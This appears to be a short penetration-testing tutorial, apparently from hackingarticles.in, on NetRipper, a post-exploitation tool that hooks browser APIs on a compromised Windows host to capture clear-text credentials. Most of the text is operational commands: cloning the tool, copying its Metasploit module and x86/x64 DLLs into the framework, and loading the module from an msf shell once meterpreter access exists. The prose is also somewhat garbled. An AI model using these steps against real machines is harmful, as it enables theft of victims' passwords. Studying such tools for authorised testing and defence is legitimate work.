Dumping Clear-Text Passwords from Browsers using NetRipper
https://www.hackingarticles.in/dumping-clear-text-passwords-from-browsers-using-netripper/

In the case of Web Browser, suppose the victim is browsing a particular Web Service. He/she enters their credentials in a form created on the Web Page. The data on this form is supposed to be encrypted and carried to the 
Host Server with the help of a Web Service or API. The NetRipper hooks to that particular API and reads the credentials that are was carrying and then stores the data back into the Victimâ€™s system

Post Exploitation tool (first it need to has meterpreter access) 
If you want to build the binary from scratch then check the release notes for info. Now to being, cloned the entire git to my attacker machine.

#git clone http://github.com/NytroRST/NetRipper.git

need to run a series of commands so that we can access the NetRipper from the Metasploit Framework.
cd netripper
netripper#mkdir /usr/share/metasploit-framework/modules/post/windows/gather/netripper
netripper#cp Metasploit/netripper.rb /usr/share/metasploit-framework/modules/post/windows/gather/netripper/netripper.rb
netripper#cp x86/DLL.x86.dll /usr/share/metasploit-framework/modules/post/windows/gather/netripper/DLL.x86.dll
netripper#cp x64/DLL.x64.dll /usr/share/metasploit-framework/modules/post/windows/gather/netripper/DLL.x64.dll

Since we added modules into the Metasploit Framework, to load those, we need to run reload_all command in the Metasploit shell
msf > reload_all
use post/windows/gather/netripper/netripper
